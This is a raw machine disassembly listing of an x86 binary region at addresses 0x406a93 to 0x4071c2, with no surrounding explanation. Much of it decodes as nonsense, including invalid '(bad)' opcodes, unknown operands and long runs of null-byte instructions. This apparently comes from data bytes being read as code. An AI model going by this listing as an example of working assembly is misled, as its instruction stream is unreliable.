  406a93:	xor    dl,BYTE PTR es:[eax+0x64]
  406a97:	es sbb al,0x50
  406a9a:	pop    ds
  406a9b:	daa    
  406a9c:	int    0x4f
  406a9e:	pop    ds
  406a9f:	and    BYTE PTR [esi],ch
  406aa1:	push   eax
  406aa2:	and    BYTE PTR [eax],ah
  406aa4:	add    BYTE PTR [eax],al
  406aa6:	add    BYTE PTR [eax],al
  406aa8:	add    BYTE PTR [edi],bl
  406aaa:	push   eax
  406aab:	adc    ah,BYTE PTR [edi]
  406aad:	sbb    BYTE PTR [eax+0x16],dl
  406ab0:	daa    
  406ab1:	or     DWORD PTR [eax+0x6e],edx
  406ab4:	es jmp 0x414f:0xeb266c4f
  406abc:	es in  al,0x4f
  406abf:	aas    
  406ac0:	es add eax,0xf6260d50
  406ac6:	dec    edi
  406ac7:	adc    al,0x23
  406ac9:	test   DWORD PTR [edi+0x16],0x37502021
  406ad0:	and    BYTE PTR [ecx],ah
  406ad2:	push   eax
  406ad3:	sbb    DWORD PTR [eax],esp
  406ad5:	adc    dl,BYTE PTR [eax+0x1d]
  406ad8:	and    bh,ch
  406ada:	push   eax
  406adb:	cmp    eax,DWORD PTR [eax]
  406add:	jne    0x406a60
  406adf:	(bad)  
  406ae0:	cmp    eax,0x27ff8175
  406ae5:	xchg   edi,eax
  406ae6:	jb     0x406ae7
  406ae8:	es xchg edi,eax
  406aea:	sbb    edi,edi
  406aec:	scas   al,BYTE PTR es:[edi]
  406aed:	jne    0x406b0a
  406aef:	jmp    DWORD PTR [edi+edx*4-0x68d700e4]
  406af6:	sbb    eax,0x279609ff
  406afb:	call   FWORD PTR [esi+0x75]
  406afe:	and    edi,edi
  406b00:	pop    ss
  406b01:	push   edi
  406b02:	in     eax,dx
  406b03:	(bad)  
  406b04:	xchg   esp,eax
  406b05:	push   esi
  406b06:	pop    ss
  406b07:	jmp    DWORD PTR [ebx-0x3500dfa9]
  406b0d:	add    BYTE PTR [eax],al
  406b0f:	add    BYTE PTR [eax],al
  406b11:	add    BYTE PTR [eax-0x14],dl
  406b14:	inc    BYTE PTR [edi]
  406b16:	push   esi
  406b17:	idiv   esi
  406b19:	sub    DWORD PTR [edi+0x41],edx
  406b1c:	inc    BYTE PTR [edx-0x7e01bca9]
  406b22:	push   edi
  406b23:	xchg   ebp,eax
  406b24:	(bad)  
  406b25:	mov    eax,ds:0xa2fe3d97
  406b2a:	xchg   edi,eax
  406b2b:	test   al,0xff
  406b2d:	push   ss
  406b2e:	xchg   ebp,eax
  406b2f:	cmp    edi,edi
  406b31:	iret   
  406b32:	jo     0x406b6e
  406b34:	call   eax
  406b36:	js     0x406b73
  406b38:	call   ecx
  406b3a:	jo     0x406bb8
  406b3c:	call   edx
  406b3e:	js     0x406ac5
  406b40:	call   ebx
  406b42:	jo     0x406bc2
  406b44:	call   esp
  406b46:	js     0x406acf
  406b48:	call   ebp
  406b4a:	jo     0x406acc
  406b4c:	call   esi
  406b4e:	js     0x406bc1
  406b50:	call   edi
  406b52:	jo     0x406ad6
  406b54:	(bad)  
  406b55:	fdivr  DWORD PTR [eax-0x7d]
  406b58:	(bad)  
  406b59:	fnstenv [eax+0x2]
  406b5c:	push   edx
  406b5d:	call   FWORD PTR [edi-0x6100b2fb]
  406b63:	add    eax,0x551ff44
  406b68:	aas    
  406b69:	dec    DWORD PTR [eax+0x5]
  406b6c:	push   esi
  406b6d:	inc    DWORD PTR [ebx+0x5]
  406b70:	cmp    edi,edi
  406b72:	cmp    al,BYTE PTR ds:0xff38
  406b78:	add    BYTE PTR [eax],al
  406b7a:	add    BYTE PTR [ebp+0x5],dl
  406b7d:	cmp    edi,edi
  406b7f:	push   esp
  406b80:	add    eax,0x557ff1a
  406b85:	adc    eax,0x1c0556ff
  406b8a:	call   FWORD PTR [ecx]
  406b8c:	add    eax,0x510ff17
  406b91:	(bad)  
  406b92:	(bad)  
  406b93:	sbb    eax,DWORD PTR ds:0x512ff01
  406b99:	lock (bad) 
  406b9b:	sbb    eax,0x1cfef305
  406ba0:	add    eax,0x75ff88
  406ba5:	mov    edi,edi
  406ba7:	je     0x406ba9
  406ba9:	mov    bh,bh
  406bab:	ja     0x406bad
  406bad:	test   edi,edi
  406baf:	jbe    0x406bb1
  406bb1:	mov    edi,?
  406bb3:	jns    0x406bb5
  406bb5:	xchg   edi,edi
  406bb7:	jo     0x406bb9
  406bb9:	mov    ?,edi
  406bbb:	jnp    0x406bbd
  406bbd:	cmp    edi,0xff500072
  406bc3:	ins    DWORD PTR es:[edi],dx
  406bc4:	add    BYTE PTR [ebx-0x1],dl
  406bc7:	ins    BYTE PTR es:[edi],dx
  406bc8:	add    BYTE PTR [edx-0x1],al
  406bcb:	jg     0x406bcd
  406bcd:	cmp    eax,0x54007eff
  406bd2:	push   DWORD PTR [ecx+0x0]
  406bd5:	dec    edi
  406bd6:	jmp    FWORD PTR [eax+0x0]
  406bd9:	add    BYTE PTR [esi-0x6e],al
  406bdc:	dec    DWORD PTR ds:0x39
  406be2:	add    BYTE PTR [eax],al
  406be4:	mov    bh,dh
  406be6:	or     eax,0xdf18298
  406beb:	fwait
  406bec:	jp     0x406bde
  406bee:	or     eax,0xdf1729a
  406bf3:	xchg   ebp,eax
  406bf4:	push   0xfffffff2
  406bf6:	or     eax,0xdf7627c
  406bfb:	ja     0x406c57
  406bfd:	clc    
  406bfe:	or     eax,0xdf5527e
  406c03:	jno    0x406c4f
  406c05:	test   BYTE PTR ds:0xdeb4260,0x63
  406c0c:	cmp    ch,ah
  406c0e:	or     eax,0xde93252
  406c13:	dec    ebp
  406c14:	sub    ch,dl
  406c16:	or     eax,0xdef2244
  406c1b:	aas    
  406c1c:	sbb    dh,al
  406c1e:	or     eax,0xded1236
  406c23:	sub    DWORD PTR [edx],ecx
  406c25:	out    dx,al
  406c26:	or     eax,0xe2303a8
  406c2b:	stos   DWORD PTR es:[edi],eax
  406c2c:	sti    
  406c2d:	and    ecx,DWORD PTR [esi]
  406c2f:	stos   BYTE PTR es:[edi],al
  406c30:	repz and BYTE PTR [esi],cl
  406c33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c34:	jmp    0x406c57
  406c36:	push   cs
  406c37:	lods   al,BYTE PTR ds:[esi]
  406c38:	jecxz  0x406c60
  406c3a:	push   cs
  406c3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c3c:	(bad)  [edi]
  406c3e:	push   cs
  406c3f:	scas   al,BYTE PTR es:[edi]
  406c40:	shl    DWORD PTR [esi+ecx*1],cl
  406c43:	mov    eax,ds:0xb00e25cb
  406c48:	add    BYTE PTR [eax],al
  406c4a:	add    BYTE PTR [eax],al
  406c4c:	add    bl,al
  406c4e:	sbb    cl,BYTE PTR [esi]
  406c50:	mov    bl,0xbb
  406c52:	sbb    ecx,DWORD PTR [esi]
  406c54:	mov    ds:0x9d0e18b3,al
  406c59:	stos   DWORD PTR es:[edi],eax
  406c5a:	sbb    DWORD PTR [esi],ecx
  406c5c:	add    cl,ch
  406c5e:	dec    esp
  406c5f:	sub    al,0xe
  406c61:	retf   0x2d4c
  406c64:	push   cs
  406c65:	fisttp DWORD PTR [esi+ebp*1+0xe]
  406c69:	in     al,dx
  406c6a:	dec    esp
  406c6b:	das    
  406c6c:	push   cs
  406c6d:	cmp    eax,0x3e0e304c
  406c72:	dec    esp
  406c73:	xor    DWORD PTR [esi],ecx
  406c75:	scas   eax,DWORD PTR es:[edi]
  406c76:	dec    esp
  406c77:	xor    cl,BYTE PTR [esi]
  406c79:	mov    al,ds:0x810e334c
  406c7e:	dec    esp
  406c7f:	xor    al,0xe
  406c81:	or     BYTE PTR [ebp+esi*1+0xe],0x73
  406c86:	dec    esp
  406c87:	ss push cs
  406c89:	fs dec esp
  406c8b:	aaa    
  406c8c:	push   cs
  406c8d:	mov    ch,0x4c
  406c8f:	cmp    BYTE PTR [esi],cl
  406c91:	mov    dh,0x4c
  406c93:	cmp    DWORD PTR [esi],ecx
  406c95:	push   0x4c
  406c97:	cmp    eax,0x3e4c5b0e
  406c9c:	push   cs
  406c9d:	ins    BYTE PTR es:[edi],dx
  406c9e:	dec    esp
  406c9f:	aas    
  406ca0:	push   cs
  406ca1:	ins    DWORD PTR es:[edi],dx
  406ca2:	dec    esp
  406ca3:	inc    eax
  406ca4:	push   cs
  406ca5:	jle    0x406cf3
  406ca7:	inc    ecx
  406ca8:	push   cs
  406ca9:	jg     0x406cf7
  406cab:	inc    edx
  406cac:	push   cs
  406cad:	xor    BYTE PTR [ebx],al
  406caf:	inc    esp
  406cb0:	push   cs
  406cb1:	add    BYTE PTR [eax],al
  406cb3:	add    BYTE PTR [eax],al
  406cb5:	add    BYTE PTR [ecx],dh
  406cb7:	add    eax,DWORD PTR [ebp+0xe]
  406cba:	ret    0x4602
  406cbd:	push   cs
  406cbe:	mov    bl,0x2
  406cc0:	inc    edi
  406cc1:	push   cs
  406cc2:	les    eax,FWORD PTR [edx]
  406cc4:	dec    eax
  406cc5:	push   cs
  406cc6:	lds    eax,FWORD PTR [edx]
  406cc8:	dec    ecx
  406cc9:	push   cs
  406cca:	mov    dh,0x2
  406ccc:	dec    edx
  406ccd:	push   cs
  406cce:	mov    bh,0x2
  406cd0:	dec    ebx
  406cd1:	push   cs
  406cd2:	call   0xe94eb8d9
  406cd7:	add    cl,BYTE PTR [ebp+0xe]
  406cda:	jne    0x406d47
  406cdc:	add    DWORD PTR [eax+0x7b],edx
  406cdf:	push   0x1
  406ce1:	push   ecx
  406ce2:	jae    0x406cad
  406ce4:	add    BYTE PTR [edx+0x6b],dl
  406ce7:	enter  0x5300,0x83
  406ceb:	iret   
  406cec:	add    BYTE PTR [ebx+edi*2-0x2a],dl
  406cf0:	add    BYTE PTR [ebp+0x73],dl
  406cf3:	lods   eax,DWORD PTR ds:[esi]
  406cf4:	add    BYTE PTR [esi+0x6b],dl
  406cf7:	mov    ah,0x0
  406cf9:	push   edi
  406cfa:	xor    DWORD PTR [ecx-0x4d84a800],0x0
  406d01:	pop    ecx
  406d02:	jae    0x406d7e
  406d04:	(bad)  
  406d05:	xor    BYTE PTR [edi+esi*2+0x788431fe],ah
  406d0c:	(bad)  
  406d0d:	xor    al,BYTE PTR [ebp+eax*4-0x417bcc02]
  406d14:	std    
  406d15:	xor    al,0x84
  406d17:	ret    
  406d18:	std    
  406d19:	xor    eax,0x0
  406d1e:	add    BYTE PTR [esp+edi*4-0x3],ah
  406d22:	ss fs sar ebp,0x37
  406d27:	fs mov dl,0xfd
  406d2a:	cmp    BYTE PTR [edi+ebp*4-0x3],ah
  406d2e:	cmp    DWORD PTR [eax+eax*8-0x3],eax
  406d32:	cmp    al,BYTE PTR [ebp+ecx*1-0x2]
  406d36:	cmp    eax,DWORD PTR [esi+esi*2-0x3]
  406d3a:	cmp    al,0x44
  406d3c:	jnp    0x406d3b
  406d3e:	cmp    eax,0x3efd84a4
  406d43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d44:	imul   edi,ebp,0xfccaa43f
  406d4a:	inc    eax
  406d4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d4c:	(bad)  
  406d4d:	cld    
  406d4e:	inc    ecx
  406d4f:	test   al,cl
  406d51:	cld    
  406d52:	inc    edx
  406d53:	test   ch,dl
  406d55:	cld    
  406d56:	inc    ebx
  406d57:	test   BYTE PTR [edx],al
  406d59:	pop    esp
  406d5a:	std    
  406d5b:	xor    DWORD PTR [ecx],edx
  406d5d:	push   edi
  406d5e:	std    
  406d5f:	cmp    BYTE PTR [ecx],dl
  406d61:	pop    esi
  406d62:	std    
  406d63:	xor    edx,DWORD PTR [ecx]
  406d65:	push   ecx
  406d66:	std    
  406d67:	cmp    dl,BYTE PTR [ecx]
  406d69:	inc    eax
  406d6a:	std    
  406d6b:	sub    eax,0x3cfd4311
  406d70:	adc    DWORD PTR [edx],esi
  406d72:	std    
  406d73:	aas    
  406d74:	adc    DWORD PTR ds:0xa4112efd,ebp
  406d7a:	std    
  406d7b:	sub    DWORD PTR [ecx],edx
  406d7d:	lahf   
  406d7e:	std    
  406d7f:	rcl    BYTE PTR [ecx],0x96
  406d82:	std    
  406d83:	add    BYTE PTR [eax],al
  406d85:	add    BYTE PTR [eax],al
  406d87:	add    BYTE PTR [ebx-0x4d02d6ef],bh
  406d8d:	adc    DWORD PTR [eax],ebp
  406d8f:	std    
  406d90:	lds    edx,FWORD PTR [ecx]
  406d92:	sub    edi,ebp
  406d94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d95:	adc    DWORD PTR [edx],ebp
  406d97:	std    
  406d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d99:	adc    DWORD PTR ds:0x2c11a6fd,esp
  406d9f:	std    
  406da0:	mov    eax,ds:0xc8fd2711
  406da5:	adc    DWORD PTR [esi],ebp
  406da7:	std    
  406da8:	ret    
  406da9:	adc    DWORD PTR [ecx],esp
  406dab:	std    
  406dac:	retf   0x3011
  406daf:	std    
  406db0:	mov    ebp,0xacfd3311
  406db5:	adc    DWORD PTR [edx],esp
  406db7:	std    
  406db8:	scas   eax,DWORD PTR es:[edi]
  406db9:	adc    DWORD PTR ds:0xb4119efd,ebx
  406dbf:	(bad)  
  406dc0:	cdq    
  406dc1:	adc    DWORD PTR [edi-0x59eeaf02],ebp
  406dc7:	dec    BYTE PTR [ebx+0x11]
  406dca:	mov    ecx,0x981142fe
  406dcf:	(bad)  
  406dd0:	push   ebp
  406dd1:	adc    DWORD PTR [ebx+0x1154fe],ebx
  406dd7:	call   0xa2c3:0x9530dfcb
  406dde:	adc    DWORD PTR [ebx+edi*4-0x4c48ee67],edi
  406de5:	cwde   
  406de6:	adc    DWORD PTR [esi-0x4eee6855],edi
  406dec:	add    BYTE PTR [eax],al
  406dee:	add    BYTE PTR [eax],al
  406df0:	add    BYTE PTR [ebx-0x645fee6a],ah
  406df6:	popf   
  406df7:	adc    DWORD PTR [ebx-0x6dee636d],esp
  406dfd:	mov    ebx,DWORD PTR [ebx-0x657c72ef]
  406e03:	adc    DWORD PTR [ebx+edi*2-0x6f],eax
  406e07:	adc    DWORD PTR [edi],edi
  406e09:	jae    0x406d9f
  406e0b:	adc    DWORD PTR [esi],esi
  406e0d:	imul   edx,DWORD PTR [ebp-0x699cb6ef],0x11
  406e14:	dec    eax
  406e15:	pop    ebx
  406e16:	(bad)  
  406e17:	adc    DWORD PTR [ebx+0x53],ecx
  406e1a:	nop
  406e1b:	adc    DWORD PTR [edx+0x4b],ecx
  406e1e:	xchg   ecx,eax
  406e1f:	adc    DWORD PTR [ebp+0x43],eax
  406e22:	xchg   edx,eax
  406e23:	adc    DWORD PTR [ebx+edi*1],ecx
  406e26:	mov    edx,DWORD PTR [ecx]
  406e28:	pop    es
  406e29:	xor    ecx,DWORD PTR [ecx+edx*1+0x118d2b0e]
  406e30:	add    DWORD PTR [ebx],esp
  406e32:	mov    ss,WORD PTR [ecx]
  406e34:	adc    BYTE PTR [ebx],bl
  406e36:	xchg   DWORD PTR [ecx],edx
  406e38:	adc    edx,DWORD PTR [ebx]
  406e3a:	mov    BYTE PTR [ecx],dl
  406e3c:	add    cl,BYTE PTR [ebx]
  406e3e:	mov    DWORD PTR [ecx],edx
  406e40:	std    
  406e41:	add    BYTE PTR [edx+0x42f8d411],cl
  406e47:	adc    edi,ecx
  406e49:	lock inc ebx
  406e4b:	adc    esi,eax
  406e4d:	call   0xe1199f28
  406e52:	shl    BYTE PTR [eax],cl
  406e54:	add    BYTE PTR [eax],al
  406e56:	add    BYTE PTR [eax],al
  406e58:	add    BYTE PTR [eax],al
  406e5a:	sbb    eax,0xe317748
  406e5f:	dec    eax
  406e60:	jle    0x406e93
  406e62:	cmovs  eax,DWORD PTR [eax-0x7cb7f7cf]
  406e69:	xor    ecx,ebx
  406e6b:	inc    edi
  406e6c:	test   DWORD PTR [ecx],esi
  406e6e:	or     cl,BYTE PTR [eax-0x74]
  406e71:	xor    DWORD PTR [ebx],ecx
  406e73:	dec    eax
  406e74:	lea    esi,[ecx]
  406e76:	add    al,0x48
  406e78:	jmp    0xf611:0xef47f511
  406e7f:	inc    edi
  406e80:	clc    
  406e81:	adc    DWORD PTR [ebx],eax
  406e83:	inc    edi
  406e84:	test   al,0x20
  406e86:	cmp    BYTE PTR [edx-0x55],dl
  406e89:	and    al,dl
  406e8b:	push   edx
  406e8c:	push   ecx
  406e8d:	add    DWORD PTR [ecx],edx
  406e8f:	push   edx
  406e90:	push   edx
  406e91:	add    DWORD PTR [edx],eax
  406e93:	push   edx
  406e94:	ja     0x406e97
  406e96:	in     al,dx
  406e97:	and    al,0xa0
  406e99:	and    ch,ch
  406e9b:	and    al,0xa1
  406e9d:	and    dh,bh
  406e9f:	and    al,0xa2
  406ea1:	and    bh,bh
  406ea3:	and    al,0xa3
  406ea5:	and    al,bh
  406ea7:	and    al,0xa4
  406ea9:	and    BYTE PTR [ecx-0x45df5adb],ch
  406eaf:	and    eax,0x25bb20a6
  406eb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406eb5:	and    BYTE PTR [ebp+eiz*1+0x25c520a8],dh
  406ebc:	test   eax,0x20
  406ec1:	add    BYTE PTR [eax],al
  406ec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ec4:	and    eax,0x25b720aa
  406ec9:	stos   DWORD PTR es:[edi],eax
  406eca:	and    BYTE PTR [eax+0x25],al
  406ecd:	lods   al,BYTE PTR ds:[esi]
  406ece:	and    BYTE PTR [esp+edi*4],al
  406ed1:	(bad)  
  406ed2:	jmp    esp
  406ed4:	add    al,0x0
  406ed6:	add    BYTE PTR [ebp+0x62],dh
  406ed9:	dec    edx
  406eda:	add    BYTE PTR [ebp+0x62],dh
  406edd:	add    eax,DWORD PTR [eax]
  406edf:	jne    0x406f35
  406ee1:	dec    edx
  406ee2:	add    BYTE PTR [ebp+0x57],dh
  406ee5:	add    eax,DWORD PTR [eax]
  406ee7:	jne    0x406f47
  406ee9:	dec    edx
  406eea:	add    BYTE PTR [ebp+0x26],dh
  406eed:	add    eax,DWORD PTR [eax]
  406eef:	jne    0x406f3d
  406ef1:	dec    edx
  406ef2:	add    BYTE PTR [ebp+0x4c],dh
  406ef5:	add    eax,DWORD PTR [eax]
  406ef7:	jne    0x406f4d
  406ef9:	dec    edx
  406efa:	add    BYTE PTR [ebp+0x54],dh
  406efd:	add    eax,DWORD PTR [eax]
  406eff:	jne    0x406e81
  406f01:	dec    ebx
  406f02:	add    BYTE PTR [ebp+0x39],dh
  406f05:	add    al,0x0
  406f07:	jne    0x406ef4
  406f09:	dec    edx
  406f0a:	add    BYTE PTR [ebp+0x3f],dh
  406f0d:	add    al,0x0
  406f0f:	jne    0x406e9b
  406f11:	dec    edx
  406f12:	add    BYTE PTR [ebp-0x2],dh
  406f15:	add    al,0x0
  406f17:	jne    0x406ea4
  406f19:	dec    edx
  406f1a:	add    BYTE PTR [ebp-0x1],dh
  406f1d:	add    al,0x0
  406f1f:	jne    0x406f8d
  406f21:	dec    edx
  406f22:	add    BYTE PTR [ebp+0x0],dh
  406f25:	add    eax,0x0
  406f2a:	add    BYTE PTR [eax],al
  406f2c:	jne    0x406f93
  406f2e:	dec    edx
  406f2f:	add    BYTE PTR [ebp+0x1],dh
  406f32:	add    eax,0x4a867500
  406f37:	add    BYTE PTR [ebp+0x3a],dh
  406f3a:	add    al,0x0
  406f3c:	jne    0x406ec5
  406f3e:	dec    edx
  406f3f:	add    BYTE PTR [ebp+0x3b],dh
  406f42:	add    al,0x0
  406f44:	jne    0x406fae
  406f46:	dec    edx
  406f47:	add    BYTE PTR [ebp+0x3c],dh
  406f4a:	add    al,0x0
  406f4c:	jne    0x406fc7
  406f4e:	dec    edx
  406f4f:	add    BYTE PTR [ebp+0x42],dh
  406f52:	add    eax,DWORD PTR [eax]
  406f54:	jne    0x406f58
  406f56:	dec    eax
  406f57:	dec    ebx
  406f58:	jne    0x406f5c
  406f5a:	or     eax,0x4b027504
  406f5f:	dec    ebx
  406f60:	jne    0x406f64
  406f62:	add    al,BYTE PTR [esi*2+0x754b4a02]
  406f69:	add    cl,BYTE PTR [eax*1+0x4b430275]
  406f70:	jne    0x406f74
  406f72:	inc    BYTE PTR [ebx]
  406f74:	jne    0x406f78
  406f76:	adc    cl,BYTE PTR [ebx+0x75]
  406f79:	add    ch,dl
  406f7b:	add    al,0x75
  406f7d:	add    ch,BYTE PTR [ecx+0x4a]
  406f80:	jne    0x406f84
  406f82:	leave  
  406f83:	add    esi,DWORD PTR [ebp+0x2]
  406f86:	jo     0x406fd2
  406f88:	jne    0x406f8c
  406f8a:	lock add esi,DWORD PTR [ebp+0x2]
  406f8e:	fs dec edx
  406f90:	add    BYTE PTR [eax],al
  406f92:	add    BYTE PTR [eax],al
  406f94:	add    BYTE PTR [ebp+0x2],dh
  406f97:	fadd   QWORD PTR [esi*2+0x754a7802]
  406f9e:	add    bl,cl
  406fa0:	add    esi,DWORD PTR [ebp+0x2]
  406fa3:	jnp    0x406fef
  406fa5:	jne    0x406fa9
  406fa7:	fadd   DWORD PTR [ebx]
  406fa9:	jne    0x406fad
  406fab:	pop    edx
  406fac:	dec    edx
  406fad:	jne    0x406fb1
  406faf:	mov    ebx,0x5d027503
  406fb4:	dec    edx
  406fb5:	jne    0x406fb9
  406fb7:	mov    edx,0x7c027503
  406fbc:	dec    edx
  406fbd:	jne    0x406fc1
  406fbf:	lds    eax,FWORD PTR [ebx]
  406fc1:	jne    0x406fc5
  406fc3:	jg     0x40700f
  406fc5:	jne    0x406fc9
  406fc7:	les    eax,FWORD PTR [ebx]
  406fc9:	jne    0x406fcd
  406fcb:	pop    esi
  406fcc:	dec    edx
  406fcd:	jne    0x406fd1
  406fcf:	mov    DWORD PTR [ebx],0x51000275
  406fd5:	scas   eax,DWORD PTR es:[edi]
  406fd6:	add    al,BYTE PTR [eax]
  406fd8:	(bad)  
  406fd9:	jbe    0x406fdd
  406fdb:	add    BYTE PTR [eax+0x1100023c],al
  406fe1:	jno    0x406fe5
  406fe3:	add    BYTE PTR [ebp+0x2c],dh
  406fe6:	add    al,BYTE PTR [eax]
  406fe8:	or     dh,BYTE PTR [ecx+0x2]
  406feb:	add    BYTE PTR [ebx+0x3c],ah
  406fee:	add    al,BYTE PTR [eax]
  406ff0:	or     BYTE PTR [ecx+0x2],dh
  406ff3:	add    BYTE PTR [edx+0x2c],dl
  406ff6:	add    al,BYTE PTR [eax]
  406ff8:	or     eax,DWORD PTR [eax]
  406ffa:	add    BYTE PTR [eax],al
  406ffc:	add    BYTE PTR [eax],al
  406ffe:	jno    0x407002
  407000:	add    BYTE PTR [esp+edi*1+0x76ed0002],al
  407007:	add    al,BYTE PTR [eax]
  407009:	ja     0x407037
  40700b:	add    al,BYTE PTR [eax]
  40700d:	mov    esp,0x66000276
  407012:	cmp    al,0x2
  407014:	add    bh,cl
  407016:	jbe    0x40701a
  407018:	add    BYTE PTR [ebx+0x2c],al
  40701b:	add    al,BYTE PTR [eax]
  40701d:	add    esi,DWORD PTR [ecx+0x2]
  407020:	add    BYTE PTR [edx-0x2dfffd44],dl
  407026:	jbe    0x40702a
  407028:	add    BYTE PTR [ebp-0x42fffd54],al
  40702e:	jbe    0x407032
  407030:	add    BYTE PTR [esp+edi*4+0x76cc0002],dl
  407037:	add    al,BYTE PTR [eax]
  407039:	xchg   DWORD PTR [edx+eax*1+0x276bf00],ebp
  407040:	add    BYTE PTR [esi-0x44],dl
  407043:	add    al,BYTE PTR [eax]
  407045:	mov    ?,WORD PTR [edi+0x2]
  407048:	add    BYTE PTR [ecx-0x54],bl
  40704b:	add    al,BYTE PTR [eax]
  40704d:	mov    DWORD PTR [esi+0x2],esi
  407050:	add    BYTE PTR [eax],al
  407052:	dec    ebp
  407053:	mov    ebx,0x1fdffff
  407058:	add    BYTE PTR [eax],al
  40705a:	ds mov ebx,0x1eeffff
  407060:	add    BYTE PTR [eax],al
  407062:	add    BYTE PTR [eax],al
  407064:	add    BYTE PTR [eax],al
  407066:	add    BYTE PTR [edi],cl
  407068:	mov    ebx,0xfe3fffff
  40706d:	(bad)  
  40706e:	inc    DWORD PTR [eax]
  407070:	mov    ebx,0xfe30ffff
  407075:	(bad)  
  407076:	call   DWORD PTR [ecx-0x46]
  407079:	(bad)  
  40707a:	push   DWORD PTR [ecx]
  40707c:	(bad)  
  40707d:	(bad)  
  40707e:	inc    DWORD PTR [edx-0x46]
  407081:	(bad)  
  407082:	push   DWORD PTR [edx]
  407084:	(bad)  
  407085:	(bad)  
  407086:	call   DWORD PTR [ebx-0x46]
  407089:	(bad)  
  40708a:	push   DWORD PTR [ebx-0x2]
  40708d:	(bad)  
  40708e:	inc    DWORD PTR [edx+edi*4-0x1]
  407092:	push   DWORD PTR [esi+edi*8-0x1]
  407096:	push   DWORD PTR ds:0x65ffffba
  40709c:	(bad)  
  40709d:	(bad)  
  40709e:	dec    DWORD PTR [edx-0x46]
  4070a1:	(bad)  
  4070a2:	(bad)  
  4070a3:	jl     0x4070a6
  4070a5:	add    BYTE PTR [eax],al
  4070a7:	sbb    edi,DWORD PTR [edx+0x14dffff]
  4070ad:	add    BYTE PTR [eax],al
  4070af:	mov    WORD PTR [edx+0x13effff],?
  4070b5:	add    BYTE PTR [eax],al
  4070b7:	popf   
  4070b8:	mov    edx,0x10fffff
  4070bd:	add    BYTE PTR [eax],al
  4070bf:	mov    ?,WORD PTR [edx+0x100ffff]
  4070c5:	add    BYTE PTR [eax],al
  4070c7:	pop    edi
  4070c8:	mov    edx,0xffff
  4070cd:	add    BYTE PTR [eax],al
  4070cf:	add    BYTE PTR [ecx],al
  4070d1:	add    DWORD PTR [eax],eax
  4070d3:	add    BYTE PTR [ebp+0x17],dh
  4070d6:	dec    eax
  4070d7:	add    BYTE PTR [ebp+0x6d],dh
  4070da:	add    eax,DWORD PTR [eax]
  4070dc:	jne    0x4070f4
  4070de:	dec    eax
  4070df:	add    BYTE PTR [ebp-0x34],dh
  4070e2:	add    al,BYTE PTR [eax]
  4070e4:	jne    0x4070fb
  4070e6:	dec    eax
  4070e7:	add    BYTE PTR [ebp-0x2d],dh
  4070ea:	add    al,BYTE PTR [eax]
  4070ec:	jne    0x407082
  4070ee:	inc    edi
  4070ef:	add    BYTE PTR [ebp-0x1e],dh
  4070f2:	add    eax,DWORD PTR [eax]
  4070f4:	jne    0x407099
  4070f6:	inc    edi
  4070f7:	add    BYTE PTR [ebp-0x4f],dh
  4070fa:	add    eax,DWORD PTR [eax]
  4070fc:	jne    0x407090
  4070fe:	inc    edi
  4070ff:	add    BYTE PTR [ebp-0x40],dh
  407102:	add    eax,DWORD PTR [eax]
  407104:	jne    0x4070a7
  407106:	inc    edi
  407107:	add    BYTE PTR [ebp+0x17],dh
  40710a:	add    al,0x0
  40710c:	jne    0x40709e
  40710e:	inc    edi
  40710f:	add    BYTE PTR [ebp-0x1a],dh
  407112:	add    eax,DWORD PTR [eax]
  407114:	jne    0x4070b5
  407116:	inc    edi
  407117:	add    BYTE PTR [ebp-0xb],dh
  40711a:	add    eax,DWORD PTR [eax]
  40711c:	jne    0x4070ac
  40711e:	inc    edi
  40711f:	add    BYTE PTR [ebp+0x44],dh
  407122:	add    eax,DWORD PTR [eax]
  407124:	jne    0x4070c3
  407126:	inc    edi
  407127:	add    BYTE PTR [ebp-0x25],dh
  40712a:	add    eax,DWORD PTR [eax]
  40712c:	jne    0x40713a
  40712e:	inc    edi
  40712f:	add    BYTE PTR [ebp-0x26],dh
  407132:	add    eax,DWORD PTR [eax]
  407134:	add    BYTE PTR [eax],al
  407136:	add    BYTE PTR [eax],al
  407138:	add    BYTE PTR [ebp+0x9],dh
  40713b:	inc    edi
  40713c:	add    BYTE PTR [ebp-0x29],dh
  40713f:	add    eax,DWORD PTR [eax]
  407141:	jne    0x40712d
  407143:	inc    esi
  407144:	add    BYTE PTR [ebp-0x28],dh
  407147:	add    eax,DWORD PTR [eax]
  407149:	jne    0x407132
  40714b:	inc    esi
  40714c:	add    BYTE PTR [ebp-0x23],dh
  40714f:	add    eax,DWORD PTR [eax]
  407151:	jne    0x407155
  407153:	cmp    al,BYTE PTR [edi+0x75]
  407156:	add    ah,BYTE PTR [esp+eax*1+0x75]
  40715a:	add    bh,BYTE PTR ds:0x67027547
  407160:	add    al,0x75
  407162:	add    bl,BYTE PTR [edi+eax*2]
  407165:	jne    0x407169
  407167:	data16 add al,0x75
  40716a:	add    cl,BYTE PTR [eax]
  40716c:	inc    edi
  40716d:	jne    0x407171
  40716f:	dec    ecx
  407170:	add    al,0x75
  407172:	add    cl,bl
  407174:	inc    esi
  407175:	jne    0x407179
  407177:	mov    BYTE PTR [ebx],al
  407179:	jne    0x40717d
  40717b:	retf   0x7546
  40717e:	add    cl,BYTE PTR [ebx-0x32fd8afd]
  407184:	inc    esi
  407185:	jne    0x407189
  407187:	mov    al,BYTE PTR [esi*2+0x7546c002]
  40718e:	add    al,BYTE PTR [ebp-0x6cfd8afd]
  407194:	inc    esi
  407195:	jne    0x407199
  407197:	inc    esp
  407198:	add    al,0x75
  40719a:	add    al,BYTE PTR [edx+0x46]
  4071a0:	add    BYTE PTR [eax],al
  4071a2:	jne    0x4071a6
  4071a4:	xor    al,BYTE PTR [esi*2+0x75469502]
  4071ab:	add    bl,BYTE PTR ds:0xe027504
  4071b1:	inc    edi
  4071b2:	jne    0x4071b6
  4071b4:	or     al,0x4
  4071b6:	jne    0x4071ba
  4071b8:	loopne 0x4071bd
  4071ba:	jne    0x4071be
  4071bc:	or     cl,ch
  4071be:	mov    ah,0x2
  4071c0:	rol    DWORD PTR [ebx],cl
  4071c2:	jne    0x4071c6
